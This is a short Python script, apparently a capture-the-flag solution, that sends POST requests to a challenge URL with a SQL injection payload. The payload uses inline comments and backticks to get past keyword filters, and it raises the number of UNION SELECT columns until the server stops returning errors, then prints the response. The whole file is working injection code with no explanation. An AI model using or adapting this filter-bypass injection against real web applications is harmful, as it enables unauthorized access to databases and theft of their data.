from sys import argv
import requests

def print_ascii(word):
    print(list(map(ord, word)))

# print_ascii(argv[1])


sess = requests.session()

def login(n):
    url = 'https://uw2017.p4.team/filtration'

    base_id = "1/*a*/union/*a*/sel``ect/*a*/0"

    for i in range(1, n):
        base_id += ",{}".format(i)

    base_id += "/*a*/limit/*a*/1,1"

    print(base_id)

    data = {
        'id': base_id,
    }

    # print(data)

    resp = sess.post(url, data=data)

    if not "Fatal error" in resp.text:
        print(resp.text)
        print(c)
        return True
    return False

for c in range(0,30):
    if login(c):
        break
